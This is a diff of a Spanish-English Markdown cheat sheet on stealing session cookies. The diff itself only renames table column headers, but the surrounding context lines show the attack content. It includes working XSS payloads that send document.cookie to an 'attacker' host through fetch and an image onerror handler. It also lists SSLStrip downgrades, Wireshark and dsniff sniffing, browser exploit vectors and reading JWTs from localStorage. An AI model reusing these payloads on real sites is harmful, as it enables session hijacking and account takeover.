@@ -22,7 +22,7 @@ linked:
 
 ## XSS para `document.cookie`
 
-| **Payload** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Direct exfil | `<script>fetch('//attacker/log?c='+document.cookie)</script>` | Standard. |
 | Image src exfil | `<img src=x onerror="this.src='//attacker/?c='+document.cookie">` | Same. |
@@ -73,7 +73,7 @@ ___
 
 ## MITM (HTTP Plaintext / Weak TLS)
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | HTTP plaintext sniffing | Public WiFi + Wireshark | Standard. |
 | HTTPS downgrade | Strip TLS via SSLStrip | Pre-HSTS apps. |
@@ -96,7 +96,7 @@ ___
 
 ## Network Sniffing (LAN / Shared)
 
-| **Vector** | **Tool** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Public WiFi | Wireshark + dsniff | Standard. |
 | Office shared LAN | Same | Internal. |
@@ -118,7 +118,7 @@ ___
 
 ## Browser Exploit / Extension Abuse
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Browser RCE | Old browser + 0day | Edge. |
 | Same-Origin Policy bypass | Browser bug | Per-vuln. |
@@ -140,7 +140,7 @@ ___
 
 ## Cookie Theft via Local JS
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `document.cookie` | Direct read non-HttpOnly | Standard. |
 | `localStorage.getItem('token')` | If JWT en localStorage | XSS-vulnerable. |
